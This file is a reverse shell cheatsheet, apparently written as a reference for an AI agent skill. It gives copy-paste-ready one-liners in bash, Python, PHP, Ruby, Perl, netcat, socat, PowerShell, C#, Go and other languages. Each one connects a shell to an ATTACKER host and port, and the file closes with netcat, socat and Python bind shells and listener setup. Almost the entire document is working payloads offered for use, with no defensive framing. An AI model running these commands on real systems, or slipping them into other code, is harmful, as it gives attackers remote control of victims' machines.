---
name: reverse-shell-cheatsheet
description: >-
  One-liner reverse shell cheatsheet for 20+ languages and tools. Copy-paste ready payloads with ATTACKER/PORT placeholders.
---

# REVERSE SHELL CHEATSHEET

> Supplementary reference for [reverse-shell-techniques](./SKILL.md). Replace `ATTACKER` with your IP and `PORT` with your listener port.

## Listener Setup

```bash
nc -lvnp PORT                    # Basic netcat listener
rlwrap nc -lvnp PORT             # With readline support
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT   # Full PTY listener
```

---

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'

0<&196;exec 196<>/dev/tcp/ATTACKER/PORT; bash <&196 >&196 2>&196
```

## Python / Python3

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

## PHP

```bash
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER",PORT);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("ATTACKER",PORT);loop{c.gets.chomp!;(exit! if $_=="exit");STDOUT.reopen(c);STDERR.reopen(c);STDIN.reopen(c);system($_)}'
```

## Perl

```bash
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Netcat

```bash
nc -e /bin/sh ATTACKER PORT

nc -e /bin/bash ATTACKER PORT

# Without -e (OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# ncat
ncat ATTACKER PORT -e /bin/bash
ncat --ssl ATTACKER PORT -e /bin/bash
```

## Socat

```bash
socat TCP:ATTACKER:PORT EXEC:bash,pty,stderr,setsid,sigint,sane

socat TCP:ATTACKER:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane

socat OPENSSL:ATTACKER:PORT,verify=0 EXEC:/bin/sh
```

## Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c bash$IFS-i>&/dev/tcp/ATTACKER/PORT<&1");
```

```bash
# Java one-liner (via bash)
r = Runtime.getRuntime()
r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"})
```

## Groovy

```groovy
String host="ATTACKER";int port=PORT;String cmd="bash";Process p=["bash","-c",cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();
```

## PowerShell

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

## C# (via PowerShell)

```powershell
# Compile and execute C# reverse shell
$code = @"
using System;using System.Net.Sockets;using System.Diagnostics;using System.IO;
class S{static void Main(){TcpClient c=new TcpClient("ATTACKER",PORT);Stream s=c.GetStream();Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();StreamWriter w=new StreamWriter(s);w.AutoFlush=true;StreamReader r=new StreamReader(s);while(true){w.Write("PS>");string cmd=r.ReadLine();if(cmd=="exit")break;p.StandardInput.WriteLine(cmd);w.Write(p.StandardOutput.ReadLine());}}}
"@
Add-Type -TypeDefinition $code -Language CSharp -OutputType ConsoleApplication -OutputAssembly shell.exe
```

## Node.js

```javascript
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/PORT 0>&1')

// Alternative: net module
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("bash",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

## Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER',PORT);os.execute('sh -i <&3 >&3 2>&3');"

lua5.1 -e 'local host,port="ATTACKER",PORT local socket=require("socket") local tcp=socket.tcp() tcp:connect(host,port) while true do local cmd,status=tcp:receive() local f=io.popen(cmd,"r") local s=f:read("*a") f:close() tcp:send(s) if status=="closed" then break end end tcp:close()'
```

## Go

```go
// Compile: GOOS=linux GOARCH=amd64 go build -o shell shell.go
package main
import("os/exec";"net")
func main(){c,_:=net.Dial("tcp","ATTACKER:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
```

## Rust

```bash
# Requires compilation; use cross-compile for target OS
# Minimal reverse shell in Rust — compile with:
# rustc shell.rs -o shell
```

## Awk

```bash
awk 'BEGIN {s="/inet/tcp/0/ATTACKER/PORT";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}'
```

## Dart

```bash
# Requires dart SDK
import 'dart:io';
void main() async {
  var s = await Socket.connect("ATTACKER", PORT);
  Process.start("bash", ["-i"]).then((p) { s.pipe(p.stdin); p.stdout.pipe(s); p.stderr.pipe(s); });
}
```

## Elixir

```elixir
:os.cmd(:erlang.binary_to_list("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"))
```

---

## BIND SHELLS

```bash
# Netcat bind shell (on victim)
nc -lvnp 4444 -e /bin/bash
# Connect from attacker:
nc VICTIM 4444

# Socat bind shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# Python bind shell
python3 -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")'
```
